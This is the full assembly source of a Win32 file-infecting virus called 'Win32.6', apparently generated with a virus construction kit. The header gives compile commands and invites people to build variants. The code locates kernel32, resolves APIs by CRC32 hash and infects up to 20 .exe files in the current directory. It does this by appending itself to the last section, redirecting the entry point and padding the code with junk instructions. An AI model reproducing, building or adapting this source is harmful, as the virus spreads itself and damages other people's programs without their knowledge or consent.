              
;
;
; Win32.6 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.6
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 6
;  Infection Type         : increasing last section
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : searching on fixed locations
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 28
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ecx
 not ebx                                ; Trash
                                        ; mov ebp, ecx
 push ecx
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
                                        ; mov ebx, -1
 mov ebx, 0
 add ebx, -1d
 and ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ebx

 neg ecx                                ; Trash
                                        ; clear ebx
 sub ebx, ebx
 add ebx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], ebx
 and dword ptr [ebp+Trash1], edx        ; Trash




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 sub edx, ecx                           ; Trash
 lea eax, [ebp+filemask]
 xchg eax, ecx

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 add eax, 1d
 cmp eax, 0
 je EndInfectCurDir
                                        ; Set Infection Counter
                                        ; mov edx, 20
 mov edx, ( 20d + 22d )
 sub edx, 22d
 mov dword ptr [ebp+InfCounter], 0
 add dword ptr [ebp+InfCounter], edx

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 sbb ebx, 21d                           ; Trash
                                        ; clear ebx
 and ebx, 0
 xor ebx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov eax, [ebx+3Ch]
 add eax, ebx
                                        ; get File Alignment
                                        ; add eax, 60
 add eax, 60d
 mov ecx, [eax]
 add eax, -60d
                                        ; mov edx, -1
 mov edx, ( -1d + 12d )
 sub edx, 12d
 and edx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], ecx
 inc ebx                                ; Trash
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg1], edx
 call Align
 push dword ptr [ebp+AlignReg1]
 pop edx
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 xor dword ptr [ebp+NewSize], edx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], edx
 shl eax, 17d                           ; Trash
 call CreateMap
 jc NoEXE
 sbb ebx, 14d                           ; Trash
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov eax, dword ptr [esi+3Ch]
 add eax, esi
                                        ; infect by increasing the last section
 mov esi, eax
                                        ; get last section
                                        ; clear edx
 xor edx, edx
 mov dx, word ptr [esi+06h]
 add edx, -1
 imul edx, edx, 28h
 add eax, edx
                                        ; add eax, 120
 dec eax
 add eax, 121d
 mov ecx, dword ptr [esi+74h]
 clc
 rcl ecx, 3
 add eax, ecx
                                        ; get old Entrypoint
 mov ecx, dword ptr [esi+28h]
 adc edx, ebx                           ; Trash
 mov dword ptr [ebp+OldEIP], -1
 and dword ptr [ebp+OldEIP], ecx
 mov ecx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], ecx
                                        ; clear ecx
 mov ecx, -42394d
 add ecx, 42394d

 add ecx, [eax+10h]
                                        ; mov edx, ecx
 push ecx
 pop edx
 add ecx, [eax+14h]
 push ecx
 push edx
 pop ebx
 add eax, 0Ch
 add ebx, [eax]
 sub eax, 0Ch
 mov dword ptr [ebp+NewEIP], 0
 add dword ptr [ebp+NewEIP], ebx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], ebx
 mov ebx, [eax+10h]
 push ebx
                                        ; calculate new section size
 push dword ptr [esi+3Ch]
 add ebx, VirusSize
 pop dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], ebx
 call Align
 mov ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [eax+10h], ebx
 pop ebx
 add ebx, VirusSize
 mov dword ptr [eax+08h], ebx
 mov ebx, dword ptr [eax+10h]
 add ebx, dword ptr [eax+0Ch]
 mov dword ptr [esi+50h], ebx
                                        ; set write, read and code flag
 or dword ptr [eax+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], '6'
                                        ; Append Virus
 pop edi
 mov esi, ebp
 add esi, offset Virus

 mov ecx, VirusSize
 sar edx, 2d                            ; Trash
 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 rep movsb
                                        ; decrease Infection Counter
                                        ; clear ebx
 and ebx, 0
 add ebx, dword ptr [ebp+InfCounter]
 dec ebx
 shr eax, 30d                           ; Trash
 mov dword ptr [ebp+InfCounter], 0
 xor dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 stc
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel by using hardcoded values
 mov ebx, 077f00000h
 call GetKernel32
 jnc GetApis
 mov ebx, 0bff70000h
 call GetKernel32
 jnc GetApis
 mov ebx, 077e00000h
 call GetKernel32
 jnc GetApis

 jmp NoKernel
GetKernel32:
 pushad
                                        ; clear edi
 mov edi, -52289d
 add edi, 52289d

 lea eax, dword ptr [esp-8h]
 xchg eax, dword ptr fs:[edi]
 lea edi, [ebp+GetKernel32Exception]
 xchg ecx, edi

 push ecx
 push eax

                                        ; add ebx, 1
 sub ebx, -1d
GetKernelLoop:
                                        ; clear edx
 sub edx, edx
 dec ebx
 mov dx, word ptr [ebx+03ch]
 test dx,0f800h
 jnz GetKernelLoop
 rcl ecx, 29d                           ; Trash
 cmp ebx, dword ptr [ebx+edx+34h]
 jnz GetKernelLoop
 push ebx
 pop dword ptr [ebp+KernelMZ]
 mov ecx, [ebx+3Ch]
 add ecx, ebx
 mov [KernelPE+ebp], ecx

                                        ; clear ebx
 and ebx, 0

 pop dword ptr fs:[ebx]
 pop eax
 popad
 clc
ret

GetKernel32Exception:
                                        ; clear ebx
 mov ebx, 0

 dec ecx                                ; Trash
 mov eax, dword ptr fs:[ebx]
 mov esp, dword ptr [eax]
GetKernel32NotFound:
                                        ; clear eax
 mov eax, 66099d
 sub eax, 66099d

 pop dword ptr fs:[eax]
 pop edx
 popad
 stc
ret


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ecx Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



 mov eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov ebx, [eax+78h]
 add ebx, [ebp+KernelMZ]
                                        ; add ebx, 28
 add ebx, 28d
                                        ; get ATableVA
 mov eax, dword ptr [ebx]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], eax
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
                                        ; get NTableVA
 mov eax, dword ptr [ebx]
                                        ; add ebx, 4
 add ebx, 4d
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], eax
                                        ; get OTableVA
 mov eax, dword ptr [ebx]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], eax
 add edx, ebx                           ; Trash
 mov ebx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], -1
 and dword ptr [ebp+NTableTemp], ebx
 mov edx, dword ptr [ebx]
 add edx, [ebp+KernelMZ]
                                        ; mov ebx, edx
 mov ebx, edx
                                        ; mov esi, ebx
                                        ; clear esi
 mov esi, 0
 add esi, ebx
 mov dword ptr [ebp+TempApisearch2], esi
 push ecx
 pop dword ptr [ebp+TempApisearch3]
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; ecx Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
 mov edx, dword ptr [ebp+APICRC32]
 sub edx, dword ptr [ecx]
 cmp edx, 0
 je FoundApi1

ApiNotFound:                            ; we did not find it :(
                                        ; mov esi, -1
 mov esi, ( -1d + 22d )
 sub esi, 22d
 and esi, dword ptr [ebp+TempApisearch2]
                                        ; clear ecx
 mov ecx, 0
 xor ecx, dword ptr [ebp+TempApisearch3]
                                        ; clear ebx
 mov ebx, 0
 add ebx, dword ptr [ebp+NTableTemp]
                                        ; add ebx, 4
 add ebx, 4d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
                                        ; retrieve the offset
 movzx eax, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal eax, 1                             ; multiply with 2
 add eax, dword ptr [ebp+OTableVA]
 push eax
 pop esi
 movzx eax, word ptr [esi]
 shl eax, 2h
 add eax, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 push dword ptr [ebp+KernelMZ]
 pop ebx
 add ebx, dword ptr [eax]
 push ebx
 pop dword ptr [ebp+TempAPI]
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop esi
 popad
 jmp ExecuteHost



;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov edi, esi
 mov edi, esi
                                        ; mov edx, edi
                                        ; clear edx
 mov edx, 0
 add edx, edi
LenCRC:
                                        ; add edx, 1
 add edx, 1d
 cmp byte ptr [edx], 0
 jne LenCRC
 sub edx, edi
                                        ; mov esi, edx
                                        ; clear esi
 and esi, 0
 add esi, edx
                                        ; add esi, 1
 inc esi
 cld
                                        ; clear ecx
 xor ecx, ecx
 dec ecx
                                        ; mov ebx, ecx
                                        ; clear ebx
 mov ebx, 14848d
 sub ebx, 14848d
 add ebx, ecx
NextByteCRC:
                                        ; clear edx
 xor edx, edx
                                        ; clear eax
 mov eax, -12692d
 add eax, 12692d
 mov dl, byte ptr [edi]
                                        ; add edi, 1
 sub edi, -1d
 xor dl, cl
 mov cl, ch
 mov ch, bl
 mov bl, bh
 mov bh, 8
NextBitCRC:
 shr ax, 1
 rcr dx, 1
jnc NoCRC
 xor dx,08320h
 xor ax,0EDB8h
NoCRC:
 dec bh
jnz NextBitCRC
 xor ecx, edx
 xor ebx, eax
 dec esi
jnz NextByteCRC
 not ebx
 not ecx
 mov edx, ebx
 rol edx, 16d
 mov dx, cx
 mov dword ptr [ebp+APICRC32], edx
 popad
ret



;          [ ///// * Execute Original File * \\\\\ ]

 inc dword ptr [ebp+Trash1]             ; Trash
NoKernel:
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldBase]
 pop edx

 mov dword ptr [ebp+retBase], edx

 push dword ptr [ebp+OldEIP]
 pop ecx

 mov dword ptr [ebp+retEIP], ecx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 test ebp, ebp
 jz FirstGenHost
 mov ebx,12345678h
 org $-4
 retEIP dd 0h
 add ebx,12345678h
 org $-4
 retBase dd 0h
 jmp ebx



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov edx, 80000000h or 40000000h
 push edx
 mov edi, ebp
 add edi, offset WFD_szFileName

 push edi
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 sub eax, 1

 push eax
 pop dword ptr [ebp+FileHandle]

CreateMap:                              ; Map the file
                                        ; mov ecx, -1
 push -1d
 pop ecx
 and ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx
 push 0
 push ecx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], -1
 and dword ptr [ebp+MapHandle], eax
 pop ecx
 test eax, eax
 jz CloseFile
                                        ; clear ebx
 mov ebx, 65458d
 sub ebx, 65458d
 push ecx
 push ebx
 push ebx
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 cmp eax, 0
 je UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 xor dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 rcl edx, 9d                            ; Trash
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov eax, 276
 mov eax, ( 276d xor 24d )
 xor eax, 24d
 lea ecx, [ebp+WFD_szFileName]
 xchg ecx, edx


ClearOldData2:
 mov byte ptr [edx], 0h
                                        ; add edx, 1
 add edx, 1d
 dec eax
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea eax, [ebp+WIN32_FIND_DATA]
 xchg eax, edi

 push edi
 mov eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg edx, ebx

 push ebx
 push ecx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 add dword ptr [ebp+FindHandle], eax
ret





;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
                                        ; clear ebx
 and ebx, 0
 add ebx, NumberOfApis

                                        ; load API Names and Offsets
 lea ecx, [ebp+APINames]

 lea esi, [ebp+APIOffsets]


GetApisLoop: 
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

                                        ; search 'em
                                        ; ecx points to the CRC
                                        ; esi points to the offset

 call SearchAPI1
                                        ; add ecx, 4
 add ecx, 4d
 mov edx, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], -1
 and dword ptr [esi], edx
 and dword ptr [ebp+Trash1], 417318     ; Trash
                                        ; add esi, 4
 dec esi
 sbb eax, 25d                           ; Trash
 add esi, 5d
 sub ebx, 1
 jnz GetApisLoop
 lea ecx, [ebp+Outbreak]
 xchg ecx, ebx

 push ebx
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 mov edx, -37135d
 add edx, 37135d
 mov dword ptr [ebp+AlignTemp], eax
 div ecx
 sub ecx, edx
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp ebx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; mov eax, -1
 mov eax, 0
 add eax, -1d
 and eax, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
 cmp word ptr [eax+3Ch], 0h
 je Notagoodfile
 push dword ptr [eax+3Ch]
 pop edx
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],edx
 jb Notagoodfile
 add edx, eax
                                        ; check for PE Header
                                        ; check for EP
 movzx ebx, word ptr [edx]
 xor ebx, 'EP'
 jz Goodfile2
                                        ; clear ecx
 mov ecx, 0
                                        ; add ecx, 1
 inc ecx
 sub ecx, 1
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], '6'
 jz Notagoodfile
                                        ; check for DLL
 mov cx, word ptr [edx+16h]
 and cx, 0F000h
 cmp cx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret
 sal ebx, 9d                            ; Trash




;                  [ ///// * Data * \\\\\ ]

Data:
 AlignReg1   dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)


 APIOffsets:
 XCreateFileA           dd 0h
 XFindFirstFileA        dd 0h
 XCreateFileMappingA    dd 0h
 XCloseHandle           dd 0h
 XMapViewOfFile         dd 0h
 XFindNextFileA         dd 0h
 XFindClose             dd 0h
 XUnmapViewOfFile       dd 0h

 NTableTemp  dd 0h
 FileHandle  dd 0h
 OldEIP      dd 0h
 TempApisearch3 dd 0h
 InfCounter  dd 0h
 MapAddress  dd 0h
 AlignReg2   dd 0h
 db 'Win32.6 by SnakeByte',0
 NewEIP      dd 0h

 APINames:
 dd 08C892DDFh           ; CreateFileA
 dd 0AE17EBEFh           ; FindFirstFileA
 dd 096B2D96Ch           ; CreateFileMappingA
 dd 068624A9Dh           ; CloseHandle
 dd 0797B49ECh           ; MapViewOfFile
 dd 0AA700106h           ; FindNextFileA
 dd 0C200BE21h           ; FindClose
 dd 094524B42h           ; UnmapViewOfFile

 FindHandle  dd 0h
 counter     dw 0h
 KernelMZ    dd 0h
 OTableVA    dd 0h
 APICRC32    dd 0h
 NTableVA    dd 0h
 OldBase     dd 400000h
 Trash1      dd 0h
 AlignTemp   dd 0h
 NewSize     dd 0h
 MapHandle   dd 0h
 ATableVA    dd 0h
 TempApisearch2 dd 0h
 TempAPI     dd 0h
 KernelPE    dd 0h
 filemask    db '*.exe',0




CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear eax
 mov eax, 0
 push eax
 call ExitProcess



end FakeCode

